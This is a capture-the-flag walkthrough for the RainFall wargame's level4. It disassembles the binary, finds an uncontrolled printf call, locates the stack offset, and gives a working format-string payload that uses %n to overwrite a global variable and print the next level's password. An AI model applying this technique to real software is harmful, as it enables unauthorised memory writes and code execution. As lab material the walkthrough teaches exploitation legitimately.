# level4

## exploring the binary
```shell
level4@RainFall:~$ ./level4
phantom
phantom
level4@RainFall:~$ ./level4
society 42
society 42
```
Once again executable waits for standard input and then prints it out.

## GDB analysis
```shell
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```
The main function calls <code>n()</code> upon execution.
```shell
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
```
We see a comparison of variable <code>0x8049810</code> against <code>$0x1025544</code>.
```shell
(gdb) x/m 0x8049810
0x8049810 <m>:	Undefined output format "m".
(gdb) print 0x1025544
$1 = 16930116
```
Similarly to <code>level4</code>, there is a variable <code>m</code> which we have to modify without having any direct access to it. We check for its existence:
``` shell
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
0x0804980c  dtor_idx.6161
0x08049810  m
```

Function <code>n</code> also invokes another pre-made function, <code>p()</code>, prompting us to conduct an inspection.
```shell
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```
We opt to execute another <code>format string</code> attack.

## format string attack
We first determine which specific stack parameter is occupied by a string passed to <code>printf</code>.
``` shell
level4@RainFall:~$ python -c 'print "AAAA" + " %p" * 5' > /tmp/pattern4
level4@RainFall:~$ cat /tmp/pattern4 - | ./level4
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil)
level4@RainFall:~$ python -c 'print "AAAA" + " %p" * 10' > /tmp/pattern4
level4@RainFall:~$ cat /tmp/pattern4 - | ./level4
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0
level4@RainFall:~$ python -c 'print "AAAA" + " %p" * 15' > /tmp/pattern4
level4@RainFall:~$ cat /tmp/pattern4 - | ./level4
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
```
We found that the string <code>AAAA</code> resides in the twelfth position. With our understanding of the format string's location in the stack, our next step is to craft a string 16930116 characters in length, embedding the address of the variable (<code>0x08049810</code>) crucial for printing the next password.

## exploit
``` shell
level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' > /tmp/flag4
level4@RainFall:~$ cat /tmp/flag4 | ./level4
[...]
                                       -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
